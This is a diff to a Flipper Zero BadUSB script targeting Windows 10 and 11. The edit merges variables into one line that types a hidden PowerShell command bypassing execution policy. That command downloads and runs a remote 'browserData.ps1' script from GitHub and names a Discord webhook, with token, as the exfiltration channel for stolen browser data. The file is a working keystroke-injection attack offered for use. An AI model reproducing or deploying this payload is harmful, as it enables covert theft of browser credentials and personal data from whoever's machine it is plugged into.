@@ -8,9 +8,7 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-$var1='https://discord.com/api/webhooks/1565901591867949149/PTIyn1_aBcJDV2vm94c50wiBIMVeJj21p-rP522RYkbBv54ccuwS9voyfSPo3Y-t_sCR'
-$var2='https://raw.githubusercontent.com/ramendolia/Flipper-Zero-BadUSB/refs/heads/my-payloads/Payloads/Flip-BrowserData/browserData.ps1'
-STRING powershell -w h -ep bypass $dc=$var1;$db='';irm $var2 | iex
+STRING powershell -w h -ep bypass $dc='https://discord.com/api/webhooks/1565901591867949149/PTIyn1_aBcJDV2vm94c50wiBIMVeJj21p-rP522RYkbBv54ccuwS9voyfSPo3Y-t_sCR';$db='';irm https://raw.githubusercontent.com/ramendolia/Flipper-Zero-BadUSB/refs/heads/my-payloads/Payloads/Flip-BrowserData/browserData.ps1 | iex
 ENTER
 
 REM     Fill in either variable or both to set your exfil method.
